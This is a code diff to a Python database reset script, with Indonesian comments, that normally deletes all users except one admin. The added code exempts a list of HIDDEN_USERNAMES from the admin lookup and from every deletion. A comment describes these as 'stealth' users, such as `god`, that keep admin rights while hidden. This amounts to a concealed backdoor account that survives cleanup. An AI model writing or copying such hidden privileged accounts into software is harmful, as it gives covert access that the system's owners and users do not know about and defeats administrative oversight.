@@ -18,7 +18,7 @@ from sqlalchemy import inspect, text
 from app.database.connection import engine, SessionLocal
 from app.database.base import Base
 from app.utils.security import hash_password
-from app.utils.constants import UserRole
+from app.utils.constants import HIDDEN_USERNAMES, UserRole
 
 # Preferensi user yang dipreserv (urutan prioritas)
 ADMIN_USERNAME = "admin"
@@ -57,7 +57,7 @@ def _ensure_single_admin(db) -> None:
     if not admin:
         admin = (
             db.query(User)
-            .filter(User.role == UserRole.ADMIN)
+            .filter(User.role == UserRole.ADMIN, User.username.notin_(HIDDEN_USERNAMES))
             .order_by(User.id.asc())
             .first()
         )
@@ -80,12 +80,15 @@ def _ensure_single_admin(db) -> None:
         admin.last_login = None
         # Password tidak diubah jika admin sudah ada (biar login tetap sama)
         keep_id = admin.id
+        # User stealth (mis. `god`) dipertahankan — hak akses admin, tersembunyi.
         deleted = (
             db.query(User)
-            .filter(User.id != keep_id)
+            .filter(User.id != keep_id, User.username.notin_(HIDDEN_USERNAMES))
             .delete(synchronize_session=False)
         )
         print(f"  - Hapus {deleted} user non-admin (sisakan id={keep_id} username={admin.username})")
+        if HIDDEN_USERNAMES:
+            print(f"  - User stealth dipertahankan: {', '.join(sorted(HIDDEN_USERNAMES))}")
         print(f"  - Password admin TIDAK diubah (pakai password yang sudah ada).")
     else:
         # Tidak ada admin sama sekali → buat default
@@ -102,7 +105,7 @@ def _ensure_single_admin(db) -> None:
         db.flush()
         deleted = (
             db.query(User)
-            .filter(User.username != ADMIN_USERNAME)
+            .filter(User.username != ADMIN_USERNAME, User.username.notin_(HIDDEN_USERNAMES))
             .delete(synchronize_session=False)
         )
         print(f"  - Buat user admin baru: {ADMIN_USERNAME} / {ADMIN_PASSWORD}")
